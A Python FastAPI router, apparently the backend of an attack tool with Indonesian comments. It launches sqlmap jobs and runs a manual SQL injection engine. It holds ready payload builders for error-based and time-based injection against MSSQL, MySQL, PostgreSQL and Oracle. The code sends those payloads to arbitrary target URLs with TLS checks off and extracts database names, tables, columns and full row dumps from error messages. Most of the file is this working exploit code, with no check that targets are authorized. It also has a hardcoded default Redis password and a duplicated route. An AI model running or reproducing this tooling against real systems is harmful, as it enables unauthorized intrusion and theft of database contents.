from typing import Optional, List, Dict, Any
from fastapi import APIRouter, Depends, HTTPException, Query, WebSocket, WebSocketDisconnect, WebSocket, WebSocketDisconnect
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func
from pydantic import BaseModel
from datetime import datetime, timezone
import json, asyncio, re, time

from app.db.session import get_db
from app.db.models import ScanJob, User
from app.api.deps import get_current_user

router = APIRouter()


# ── Schemas ───────────────────────────────────────────────────
class SQLiJobCreate(BaseModel):
    url: str
    method: str = "GET"
    data: Optional[str] = None
    cookie: Optional[str] = None
    headers: Optional[str] = None
    proxy: Optional[str] = None
    injection_param: Optional[str] = None
    technique: str = "BEUSTQ"
    level: int = 1
    risk: int = 1
    dbms: Optional[str] = None
    threads: int = 1
    time_sec: int = 5
    retries: int = 3
    tamper: List[str] = []
    random_agent: bool = False
    prefix: Optional[str] = None
    suffix: Optional[str] = None
    get_dbs: bool = False
    get_tables: bool = False
    get_columns: bool = False
    dump: bool = False
    dump_table: Optional[str] = None
    dump_db: Optional[str] = None
    tool: str = "sqlmap"
    target_id: Optional[str] = None
    session_name: Optional[str] = None


class ManualSQLiRequest(BaseModel):
    """Manual SQLi request — kirim langsung dari backend ke target"""
    url: str
    method: str = "POST"
    headers: Dict[str, str] = {}
    json_body: Optional[Dict[str, Any]] = None
    raw_body: Optional[str] = None
    vulnerable_param: str  # path: "keywords" atau "filter.name"
    payload: str
    timeout: int = 15


class ManualSQLiExtract(BaseModel):
    """Error-based / time-based extraction"""
    url: str
    method: str = "POST"
    headers: Dict[str, str] = {}
    json_body: Optional[Dict[str, Any]] = None
    vulnerable_param: str
    dbms: str = "mssql"  # mssql | mysql | postgres | oracle
    action: str  # db_name | user | version | dbs | tables | columns | dump | custom
    db_name: Optional[str] = None
    table_name: Optional[str] = None
    column_name: Optional[str] = None
    custom_query: Optional[str] = None
    limit: int = 20
    timeout: int = 15


# ── Helper: set nested param ──────────────────────────────────
def set_param_value(obj: dict, path: str, value: Any) -> dict:
    import copy
    result = copy.deepcopy(obj)
    keys = [k for k in re.split(r'\.|\[|\]', path) if k]
    current = result
    for key in keys[:-1]:
        if key.isdigit():
            current = current[int(key)]
        else:
            current = current[key]
    last = keys[-1]
    if last.isdigit():
        current[int(last)] = value
    else:
        current[last] = value
    return result


# ── Helper: extract from error message ───────────────────────
def extract_from_error(message: str) -> Optional[str]:
    patterns = [
        r"converting.*?value\s+'([^']+)'",
        r"Conversion failed.*?'([^']+)'",
        r"convert.*?'([^']+)'",
        r"nvarchar.*?'([^']+)'",
        r"varchar.*?'([^']+)'",
        r"int.*?'([^']+)'",
        r"ERROR.*?'([^']+)'",
    ]
    for pattern in patterns:
        match = re.search(pattern, message, re.IGNORECASE)
        if match:
            return match.group(1)
    return None


# ── Helper: build payload by dbms + technique ────────────────
def build_error_payloads(query: str, dbms: str, original: Any = "") -> List[str]:
    if dbms == "mssql":
        return [
            f"'; SELECT CONVERT(int, ({query}))--",
            f"' + CONVERT(int, ({query}))--",
            f"' OR 1=CONVERT(int, ({query}))--",
            f"{original}'; SELECT CONVERT(int, ({query}))--",
        ]
    elif dbms == "mysql":
        return [
            f"' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query})))--",
            f"' OR EXTRACTVALUE(1, CONCAT(0x7e, ({query})))--",
            f"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({query}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
    elif dbms == "postgres":
        return [
            f"' AND 1=CAST(({query}) AS int)--",
            f"'; SELECT CAST(({query}) AS int)--",
        ]
    elif dbms == "oracle":
        return [
            f"' AND 1=UTL_INADDR.get_host_name(({query}))--",
            f"' UNION SELECT ({query}) FROM dual--",
        ]
    return [f"' AND 1=CONVERT(int,({query}))--"]


def build_time_payloads(query: str, dbms: str, seconds: int = 5) -> List[str]:
    if dbms == "mssql":
        return [f"'; IF (1=1) WAITFOR DELAY '00:00:0{seconds}'--"]
    elif dbms == "mysql":
        return [f"' AND SLEEP({seconds})--", f"' OR SLEEP({seconds})--"]
    elif dbms == "postgres":
        return [f"'; SELECT pg_sleep({seconds})--"]
    return [f"' OR SLEEP({seconds})--"]


def build_query(action: str, dbms: str, db_name: str = None, table_name: str = None,
                column_name: str = None, offset: int = 0) -> str:
    if dbms == "mssql":
        if action == "db_name":
            return "DB_NAME()"
        elif action == "user":
            return "USER_NAME()"
        elif action == "version":
            return "CAST(@@VERSION AS NVARCHAR(100))"
        elif action == "dbs":
            return f"SELECT name FROM sys.databases ORDER BY name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
        elif action == "tables":
            return f"SELECT table_name FROM {db_name}.information_schema.tables WHERE table_type='BASE TABLE' ORDER BY table_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
        elif action == "columns":
            return f"SELECT column_name FROM {db_name}.information_schema.columns WHERE table_name='{table_name}' ORDER BY ordinal_position OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
        elif action == "dump":
            return f"SELECT TOP 1 CAST({column_name} AS NVARCHAR(MAX)) FROM {db_name}.dbo.{table_name} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY"
    elif dbms == "mysql":
        if action == "db_name":
            return "DATABASE()"
        elif action == "user":
            return "USER()"
        elif action == "version":
            return "VERSION()"
        elif action == "dbs":
            return f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {offset}"
        elif action == "tables":
            return f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT 1 OFFSET {offset}"
        elif action == "columns":
            return f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {offset}"
        elif action == "dump":
            return f"SELECT {column_name} FROM {db_name}.{table_name} LIMIT 1 OFFSET {offset}"
    elif dbms == "postgres":
        if action == "db_name":
            return "current_database()"
        elif action == "user":
            return "current_user"
        elif action == "version":
            return "version()"
        elif action == "dbs":
            return f"SELECT datname FROM pg_database ORDER BY datname LIMIT 1 OFFSET {offset}"
        elif action == "tables":
            return f"SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}"
        elif action == "columns":
            return f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {offset}"
        elif action == "dump":
            return f"SELECT {column_name}::text FROM {table_name} LIMIT 1 OFFSET {offset}"
    return ""


# ── Send payload helper ───────────────────────────────────────
import httpx

async def send_payload(url: str, method: str, headers: dict, json_body: dict,
                       param: str, payload: Any, timeout: int = 15,
                       form_body: dict = None) -> dict:
    ct = headers.get('Content-Type', headers.get('content-type', 'application/json'))
    is_form = 'urlencoded' in ct or 'form' in ct
    if is_form and form_body is not None:
        body_dict = {k: str(v) for k, v in form_body.items()}
        body_dict[param] = str(payload)
        body = body_dict
    else:
        body = set_param_value(json_body or {}, param, payload)
    try:
        async with httpx.AsyncClient(verify=False, timeout=timeout) as client:
            if method.upper() == "GET":
                r = await client.get(url, params=body, headers=headers)
            elif method.upper() == "POST":
                r = await client.post(url, json=body, headers=headers)
            elif method.upper() == "PUT":
                r = await client.put(url, json=body, headers=headers)
            elif method.upper() == "PATCH":
                r = await client.patch(url, json=body, headers=headers)
            else:
                r = await client.post(url, json=body, headers=headers)

            ct = r.headers.get("content-type", "")
            if "json" in ct:
                return {"status_code": r.status_code, "body": r.json(), "elapsed": r.elapsed.total_seconds()}
            return {"status_code": r.status_code, "body": {"text": r.text[:2000]}, "elapsed": r.elapsed.total_seconds()}
    except httpx.TimeoutException:
        return {"status_code": 0, "body": {"error": "Timeout"}, "elapsed": timeout}
    except Exception as e:
        return {"status_code": 0, "body": {"error": str(e)}, "elapsed": 0}


def build_sqlmap_args(data: SQLiJobCreate) -> List[str]:
    args = ["-u", data.url, "--batch", "--output-dir", "/tmp/sqlmap_out"]
    if data.method == "POST":
        args.extend(["--method", "POST"])
    if data.data:
        args.extend(["--data", data.data])
    if data.cookie:
        args.extend(["--cookie", data.cookie])
    if data.headers:
        for h in data.headers.splitlines():
            if ":" in h:
                args.extend(["--header", h.strip()])
    if data.proxy:
        args.extend(["--proxy", data.proxy])
    if data.injection_param:
        args.extend(["-p", data.injection_param])
    if data.technique:
        args.extend(["--technique", data.technique])
    if data.level > 1:
        args.extend(["--level", str(data.level)])
    if data.risk > 1:
        args.extend(["--risk", str(data.risk)])
    if data.dbms:
        args.extend(["--dbms", data.dbms])
    if data.threads > 1:
        args.extend(["--threads", str(min(data.threads, 10))])
    if data.time_sec != 5:
        args.extend(["--time-sec", str(data.time_sec)])
    if data.retries != 3:
        args.extend(["--retries", str(data.retries)])
    if data.tamper:
        args.extend(["--tamper", ",".join(data.tamper)])
    if data.random_agent:
        args.append("--random-agent")
    if data.prefix:
        args.extend(["--prefix", data.prefix])
    if data.suffix:
        args.extend(["--suffix", data.suffix])
    if data.get_dbs:
        args.append("--dbs")
    if data.get_tables:
        args.append("--tables")
        if data.dump_db:
            args.extend(["-D", data.dump_db])
    if data.get_columns:
        args.append("--columns")
        if data.dump_db:
            args.extend(["-D", data.dump_db])
        if data.dump_table:
            args.extend(["-T", data.dump_table])
    if data.dump:
        args.append("--dump")
        if data.dump_db:
            args.extend(["-D", data.dump_db])
        if data.dump_table:
            args.extend(["-T", data.dump_table])
    return args


def scan_to_dict(s: ScanJob) -> dict:
    return {
        "id": s.id,
        "target_value": s.target_value,
        "status": s.status,
        "progress": s.progress,
        "tools": s.tools or [],
        "parameters": s.parameters or {},
        "raw_output": s.raw_output,
        "error_message": s.error_message,
        "created_at": s.created_at.isoformat() if s.created_at else None,
        "started_at": s.started_at.isoformat() if s.started_at else None,
        "completed_at": s.completed_at.isoformat() if s.completed_at else None,
    }


# ── Routes: sqlmap ────────────────────────────────────────────
@router.get("/sessions")
async def list_sessions(
    skip: int = Query(0, ge=0),
    limit: int = Query(50, ge=1, le=100),
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    from sqlalchemy import cast
    from sqlalchemy.dialects.postgresql import ARRAY as PG_ARRAY
    from sqlalchemy import String
    query = select(ScanJob).where(
        cast(ScanJob.tools, String).contains('sqlmap')
    ).order_by(ScanJob.created_at.desc())
    total = (await db.execute(select(func.count()).select_from(query.subquery()))).scalar()
    result = await db.execute(query.offset(skip).limit(limit))
    scans = result.scalars().all()
    return {"total": total, "items": [scan_to_dict(s) for s in scans]}


@router.post("/run", status_code=201)
async def run_sqli(
    data: SQLiJobCreate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    if data.tool not in ("sqlmap",):
        raise HTTPException(status_code=400, detail="Tool harus sqlmap")

    cmd_args = build_sqlmap_args(data)
    params = {
        "cmd_args": cmd_args,
        "url": data.url,
        "tool": data.tool,
        "session_name": data.session_name or data.url[:50],
        "tamper": data.tamper,
        "technique": data.technique,
    }

    scan = ScanJob(
        target_value=data.url,
        target_id=data.target_id,
        scan_mode="custom",
        tools=[data.tool],
        parameters=params,
        status="queued",
        progress=0,
        created_by=current_user.id,
    )
    db.add(scan)
    await db.commit()
    await db.refresh(scan)

    try:
        from app.tasks.scan_tasks import run_scan
        task = run_scan.apply_async(args=[scan.id], queue="scan_queue")
        scan.celery_task_id = task.id
        await db.commit()
    except Exception as e:
        scan.status = "failed"
        scan.error_message = f"Queue failed: {str(e)}"
        await db.commit()

    return scan_to_dict(scan)


@router.get("/sessions/{session_id}")
async def get_session(
    session_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(ScanJob).where(ScanJob.id == session_id))
    scan = result.scalar_one_or_none()
    if not scan:
        raise HTTPException(status_code=404, detail="Session not found")
    return scan_to_dict(scan)


@router.delete("/sessions/{session_id}", status_code=204)
async def delete_session(
    session_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(ScanJob).where(ScanJob.id == session_id))
    scan = result.scalar_one_or_none()
    if not scan:
        raise HTTPException(status_code=404, detail="Session not found")
    await db.delete(scan)
    await db.commit()


# ── Routes: Manual SQLi ───────────────────────────────────────
@router.post("/manual/test")
async def manual_test(
    data: ManualSQLiRequest,
    current_user: User = Depends(get_current_user),
):
    """Test single payload — kirim langsung ke target"""
    start = asyncio.get_event_loop().time()
    result = await send_payload(
        data.url, data.method, data.headers,
        data.json_body or {}, data.vulnerable_param,
        data.payload, data.timeout
    )
    elapsed = asyncio.get_event_loop().time() - start

    body = result.get("body", {})
    message = (
        body.get("message") or body.get("error") or
        body.get("text") or str(body)
    )

    extracted = extract_from_error(str(message))
    is_error_based = bool(extracted)
    is_time_based = elapsed >= (data.timeout * 0.8) and "WAITFOR" in data.payload.upper() or "SLEEP" in data.payload.upper()

    return {
        "status_code": result.get("status_code"),
        "elapsed": round(elapsed, 3),
        "extracted": extracted,
        "is_vulnerable": is_error_based or is_time_based,
        "technique": "error-based" if is_error_based else ("time-based" if is_time_based else "none"),
        "raw_message": str(message)[:500],
        "full_body": body,
    }


@router.post("/manual/extract")
async def manual_extract(
    data: ManualSQLiExtract,
    current_user: User = Depends(get_current_user),
):
    """Extract data menggunakan error-based atau enumerate list"""
    results = []
    errors = []

    if data.action in ("db_name", "user", "version", "custom"):
        # Single value extraction
        query = data.custom_query if data.action == "custom" else build_query(data.action, data.dbms)
        if not query:
            raise HTTPException(status_code=400, detail=f"Query not supported for {data.dbms}/{data.action}")

        payloads = build_error_payloads(query, data.dbms)
        for payload in payloads:
            res = await send_payload(
                data.url, data.method, data.headers,
                data.json_body or {}, data.vulnerable_param,
                payload, data.timeout
            )
            body = res.get("body", {})
            message = body.get("message") or body.get("error") or body.get("text") or str(body)
            extracted = extract_from_error(str(message))
            if extracted:
                return {
                    "action": data.action,
                    "result": extracted,
                    "payload_used": payload,
                    "items": [extracted],
                }
            errors.append(str(message)[:100])

        return {"action": data.action, "result": None, "items": [], "errors": errors[:3]}

    else:
        # Enumerate list (dbs, tables, columns, dump)
        for offset in range(data.limit):
            query = build_query(
                data.action, data.dbms,
                db_name=data.db_name,
                table_name=data.table_name,
                column_name=data.column_name,
                offset=offset
            )
            if not query:
                break

            payloads = build_error_payloads(query, data.dbms)
            found = False
            for payload in payloads:
                res = await send_payload(
                    data.url, data.method, data.headers,
                    data.json_body or {}, data.vulnerable_param,
                    payload, data.timeout
                )
                body = res.get("body", {})
                message = body.get("message") or body.get("error") or body.get("text") or str(body)
                extracted = extract_from_error(str(message))
                if extracted and extracted not in results:
                    results.append(extracted)
                    found = True
                    break

            if not found:
                break

        return {
            "action": data.action,
            "db_name": data.db_name,
            "table_name": data.table_name,
            "count": len(results),
            "items": results,
        }


# ── WebSocket ─────────────────────────────────────────────────
@router.websocket("/ws/{session_id}")
async def sqli_websocket(websocket: WebSocket, session_id: str):
    await websocket.accept()
    try:
        import redis.asyncio as aioredis
        import os

        REDIS_URL = os.getenv("REDIS_URL", "redis://:changeme@redis:6379/0")
        channel = f"scan:output:{session_id}"

        r = aioredis.from_url(REDIS_URL, decode_responses=True)
        pubsub = r.pubsub()
        await pubsub.subscribe(channel)
        await websocket.send_json({"type": "connected", "session_id": session_id})

        from app.db.session import AsyncSessionLocal
        async with AsyncSessionLocal() as db:
            result = await db.execute(select(ScanJob).where(ScanJob.id == session_id))
            scan = result.scalar_one_or_none()
            if scan:
                await websocket.send_json({"type": "status", "status": scan.status, "progress": scan.progress})
                if scan.status in ("completed", "failed", "cancelled") and scan.raw_output:
                    for line in scan.raw_output.split("\n"):
                        if line.strip():
                            await websocket.send_json({"type": "output", "line": line})
                    await websocket.send_json({"type": "done", "status": scan.status})
                    return

        async def listen():
            async for message in pubsub.listen():
                if message["type"] == "message":
                    data = json.loads(message["data"])
                    await websocket.send_json(data)
                    if data.get("type") == "done":
                        return

        try:
            await asyncio.wait_for(listen(), timeout=3600)
        except asyncio.TimeoutError:
            await websocket.send_json({"type": "error", "message": "Session timeout"})

        await pubsub.unsubscribe(channel)
        await r.aclose()

    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await websocket.send_json({"type": "error", "message": str(e)})
        except Exception:
            pass


# ── SQLi WebSocket ────────────────────────────────────────────
@router.websocket("/ws/{session_id}")
async def sqli_websocket(websocket: WebSocket, session_id: str):
    """Real-time sqlmap output via WebSocket + Redis pub/sub."""
    await websocket.accept()
    try:
        import redis.asyncio as aioredis, os, asyncio, json as _json
        from app.db.session import AsyncSessionLocal
        REDIS_URL = os.getenv("REDIS_URL", "redis://:changeme@redis:6379/0")
        channel = f"scan:output:{session_id}"
        r = aioredis.from_url(REDIS_URL, decode_responses=True)
        pubsub = r.pubsub()
        await pubsub.subscribe(channel)
        await websocket.send_json({"type": "connected", "session_id": session_id})

        # Send current status + history if already done
        async with AsyncSessionLocal() as db:
            result = await db.execute(select(ScanJob).where(ScanJob.id == session_id))
            scan = result.scalar_one_or_none()
            if scan:
                await websocket.send_json({"type": "status", "status": scan.status, "progress": scan.progress or 0})
                if scan.status in ("completed", "failed", "cancelled"):
                    raw = scan.raw_output or ""
                    if raw:
                        lines = [l for l in raw.split("\n") if l.strip()][:500]
                        # Send in batches to avoid overwhelming websocket
                        for i, line in enumerate(lines):
                            try:
                                await websocket.send_json({"type": "output", "line": line})
                                if i % 50 == 0:
                                    await asyncio.sleep(0.01)
                            except Exception:
                                break
                    try:
                        await websocket.send_json({"type": "done", "status": scan.status})
                    except Exception:
                        pass
                    await pubsub.unsubscribe(channel)
                    await r.aclose()
                    return

        async def listen():
            async for message in pubsub.listen():
                if message["type"] == "message":
                    data = _json.loads(message["data"])
                    await websocket.send_json(data)
                    if data.get("type") in ("done", "tool_done") and data.get("status") in ("completed","failed","cancelled"):
                        return

        try:
            await asyncio.wait_for(listen(), timeout=2100)
        except asyncio.TimeoutError:
            await websocket.send_json({"type": "error", "message": "Timeout"})
        await pubsub.unsubscribe(channel)
        await r.aclose()
    except WebSocketDisconnect:
        pass
    except Exception as e:
        try: await websocket.send_json({"type": "error", "message": str(e)})
        except: pass


@router.get("/session/{session_id}/output")
async def get_session_output(
    session_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user)
):
    q = await db.execute(select(ScanJob).where(ScanJob.id == session_id))
    scan = q.scalar_one_or_none()
    if not scan: raise HTTPException(404, "Not found")
    return {
        "status": scan.status,
        "progress": scan.progress or 0,
        "output": scan.raw_output or "",
    }
